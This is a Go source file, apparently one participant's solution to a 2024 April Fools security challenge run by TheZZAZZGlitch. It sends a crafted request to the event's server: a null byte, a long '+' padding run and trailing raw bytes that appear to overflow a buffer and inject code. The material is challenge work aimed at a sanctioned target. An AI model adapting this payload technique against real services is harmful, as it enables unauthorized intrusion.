/*
 * fools2024-solutions: source code for Kagamiin's solutions for TheZZAZZGlitch April Fools Event 2024's Security Testing Program.
 * Copyright (C) 2024 Kagamiin~
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License,
 * or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package main

import (
	"fmt"
	"log"
	"io"
	"net"
	"time"
)

const server = "fools2024.online:26273"

const payload = "GET /secret\000p=++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%00%dd%21%ea%03%c3%c6%03\r\n\r\n"

//const payload = "GET / HTTP/1.0\r\n\r\n"

func main() {
	conn, err := net.Dial("tcp", server)
	handle(err)
	
	defer func() {
		err := conn.Close()
		handle(err)
	}()
	
	conn.SetWriteDeadline(time.Now().Add(time.Second * 30))
	n, err := conn.Write([]byte(payload))
	handle(err)
	log.Printf("Wrote %d bytes to %s", n, server)

	recvBuff := make([]byte, 65536)
	conn.SetReadDeadline(time.Now().Add(time.Second * 30))
	_, err = conn.Read(recvBuff)
	if err != nil && err != io.EOF {
		panic(err)
	}
	
	fmt.Println(string(recvBuff))
}

func handle(err error) {
	if err != nil {
		panic(err)
	}
}
